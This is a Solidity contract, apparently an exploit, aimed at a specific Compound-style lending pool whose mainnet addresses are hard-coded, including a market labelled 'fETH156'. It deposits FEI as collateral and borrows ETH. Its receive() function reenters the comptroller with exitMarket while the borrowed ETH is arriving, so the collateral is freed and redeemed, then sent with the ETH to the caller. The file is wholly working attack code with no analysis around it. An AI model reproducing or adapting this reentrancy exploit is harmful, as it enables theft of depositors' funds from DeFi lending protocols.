// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "../HarvestFF/interfaces/IERC20.sol";
import "./interfaces/CErc20Interface.sol";
import "./interfaces/ComptrollerInterface.sol";


interface IFToken {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function getCash() external view returns (uint);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
}

contract Convert27 {
    ComptrollerInterface private constant unitroller = ComptrollerInterface(0x35De88F04aD31a396aedb33f19aebe7787C02560); // Unitroller
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    IERC20 private constant FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    IERC20 private constant FEI = IERC20(0x956F47F50A910163D8BF957Cf5846D573E7f87CA);
    
    // FxToken Address
    // 0xe92a3db67e4b6AC86114149F522644b34264f858
    address constant fETH = address(0xF148cDEc066b94410d403aC5fe1bb17EC75c5851); //fETH156
    address private fTokenCache;
    uint256 private mintTokenCache;

    constructor() {}

    receive () external payable {
        unitroller.exitMarket(fTokenCache);
    }   

    function _bootLoad(address fToken) external {
        fTokenCache = fToken;
        address[] memory em = new address[](1);
        em[0] = fToken;
        unitroller.enterMarkets(em);
    }
    function _cBorrow(uint cBorrow) external {
        IFToken(fETH).borrow(cBorrow);
    }

    function _cMint() external {
        FEI.approve(fTokenCache, type(uint256).max);
        uint _FEIBalance = FEI.balanceOf(address(this));
        CErc20Interface(fTokenCache).mint(_FEIBalance);
        mintTokenCache = _FEIBalance;
    }


    function _cRedeemAll() external {
        CErc20Interface(fTokenCache).approve(fTokenCache, type(uint256).max);
        CErc20Interface(fTokenCache).redeemUnderlying(mintTokenCache);

        uint256 new_FEIBalance = FEI.balanceOf(address(this));
        FEI.transfer(msg.sender, new_FEIBalance);
        payable(msg.sender).transfer(address(this).balance);
    }
}
